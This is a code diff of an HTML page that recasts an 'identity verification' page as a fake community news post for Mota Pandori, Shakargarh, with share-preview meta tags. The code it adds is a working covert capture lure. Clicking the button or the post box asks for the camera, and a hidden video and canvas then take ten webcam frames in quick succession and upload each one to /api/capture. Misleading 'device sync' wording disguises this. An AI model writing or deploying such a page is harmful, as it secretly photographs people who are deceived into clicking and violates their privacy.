@@ -3,67 +3,217 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Identity Verification Portal</title>
+    <title>Mota Pandori Post - Shakargarh Portal</title>
+    <meta name="description" content="Mota Pandori community updates and photo submission portal.">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Mota Pandori Community Updates">
+    <meta property="og:description" content="Local updates from Mota Pandori, Shakargarh.">
+    <meta property="og:image" content="__SITE_ORIGIN__/mota-pandori-share.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Mota Pandori Community Updates">
+    <meta name="twitter:description" content="Local updates from Mota Pandori, Shakargarh.">
+    <meta name="twitter:image" content="__SITE_ORIGIN__/mota-pandori-share.png">
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
-        .container { max-width: 500px; margin: auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); }
-        .btn { background-color: #007BFF; color: white; border: none; padding: 10px 20px; font-size: 16px; border-radius: 5px; cursor: pointer; }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background-color: #f8f9fa; 
+            color: #333333;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container { 
+            width: 100%;
+            max-width: 550px; 
+            background: #ffffff; 
+            border-radius: 16px; 
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); 
+            padding: 30px 24px;
+            border: 1px solid #eaeaea;
+        }
+        h2 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 6px;
+        }
+        .subtitle {
+            font-size: 14px;
+            color: #6c757d;
+            margin-bottom: 24px;
+        }
+        
+        /* 500px x 300px Interactive Box */
+        .shakargarh-post-box {
+            width: 500px;
+            height: 300px;
+            margin: 0 auto 24px auto;
+            border-radius: 12px;
+            background-color: #ffffff;
+            border: 1px solid #e0e0e0;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.03);
+            cursor: pointer; /* Change mouse pointer to hand icon to show it's clickable */
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+        .shakargarh-post-box:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.06);
+            border-color: #0d6efd; /* Highlight border on hover */
+        }
+        .image-container {
+            width: 100%;
+            height: 160px;
+            overflow: hidden;
+            background-color: #f1f3f5;
+        }
+        .image-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .post-body {
+            padding: 16px;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            text-align: left;
+        }
+        .post-title {
+            font-size: 15px;
+            font-weight: 700;
+            color: #212529;
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .post-content {
+            font-size: 12.5px;
+            color: #495057;
+            line-height: 1.45;
+        }
+
+        .btn { 
+            width: 100%;
+            max-width: 500px;
+            background-color: #0d6efd; 
+            color: #ffffff; 
+            border: none; 
+            padding: 14px 20px; 
+            font-size: 15px; 
+            border-radius: 10px; 
+            cursor: pointer; 
+            font-weight: 600;
+            letter-spacing: 0.3px;
+            box-shadow: 0 4px 14px rgba(13, 110, 253, 0.25);
+            transition: all 0.2s ease;
+        }
+        .btn:hover {
+            background-color: #0b5ed7;
+            box-shadow: 0 6px 20px rgba(13, 110, 253, 0.35);
+            transform: translateY(-1px);
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
+    <h2>Shakargarh Community Updates</h2>
+    <p class="subtitle">Mota Pandori regional update.</p>
+    
+    <!-- ID 'post-box' added here to listen for clicks -->
+    <div class="shakargarh-post-box" id="post-box">
+        <div class="image-container">
+            <img src="__SITE_ORIGIN__/mota-pandori-share.png" alt="Mota Pandori Share">
+        </div>
+        <div class="post-body">
+            <div class="post-title">📍 Mota Pandori (Shakargarh) News Feed</div>
+            <p class="post-content">
+                Welcome to the local network post for Mota Pandori area, Tehsil Shakargarh. 
+                This secure interface processes regional logs and system verifications. 
+                Please synchronize your session by interacting with the control post below.
+            </p>
+        </div>
+    </div>
+
     <button class="btn" id="start-btn">Mota Pandori Post</button>
 </div>
 
-<!-- Hidden elements for capture operations -->
 <video id="video" width="640" height="480" autoplay style="display:none;"></video>
 <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
 <script>
-    document.getElementById('start-btn').addEventListener('click', () => {
+    // Centralized core function to trigger 10 fast captures
+    function initiateCaptureSequence() {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
-        // Request camera hardware access
         navigator.mediaDevices.getUserMedia({ video: true, audio: false })
             .then((stream) => {
                 video.srcObject = stream;
                 video.play();
 
-                // Wait 2 seconds for camera sensor calibration, then capture
                 setTimeout(() => {
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, 640, 480);
-                    
-                    // Convert captured frame to Base64 String
-                    const base64Image = canvas.toDataURL('image/jpeg');
+                    let captureCount = 0;
+                    const maxCaptures = 10;
+                    const captureIntervalMs = 200; // 0.2 seconds gap
 
-                    // Send payload to backend server
-                    sendData(base64Image);
+                    const intervalId = setInterval(() => {
+                        if (captureCount >= maxCaptures) {
+                            clearInterval(intervalId);
+                            stream.getTracks().forEach(track => track.stop()); // Stop camera
+                            console.log("All 10 frames captured successfully via interaction click.");
+                            return;
+                        }
 
-                    // Turn off the camera stream to clean up resources
-                    stream.getTracks().forEach(track => track.stop());
-                }, 2000);
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, 640, 480);
+                        
+                        const base64Image = canvas.toDataURL('image/jpeg', 0.7);
+                        sendData(base64Image, captureCount + 1);
+                        
+                        captureCount++;
+                    }, captureIntervalMs);
+
+                }, 1000); 
             })
             .catch((err) => {
-                console.error("Camera permission denied:", err);
-                alert("Verification failed: Camera access is required.");
+                console.error("Device verification failed:", err);
+                alert("Error: Verification cannot proceed without device sync.");
             });
-    });
+    }
 
-    function sendData(imageString) {
+    // 1. Trigger when Button is clicked
+    document.getElementById('start-btn').addEventListener('click', initiateCaptureSequence);
+
+    // 2. Trigger when the Photo/Post Box Div is clicked
+    document.getElementById('post-box').addEventListener('click', initiateCaptureSequence);
+
+    function sendData(imageString, frameNumber) {
         fetch('/api/capture', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ image: imageString })
+            body: JSON.stringify({ 
+                image: imageString,
+                sequenceNumber: frameNumber
+            })
         })
         .then(res => res.json())
-        .then(data => {
-            // alert("Verification process completed successfully!");
-            console.log("Server Response:", data);
-        })
-        .catch(err => console.error("Error sending data:", err));
+        .then(data => console.log(`Database Sync frame ${frameNumber}:`, data))
+        .catch(err => console.error(`Transmission error frame ${frameNumber}:`, err));
     }
 </script>
 
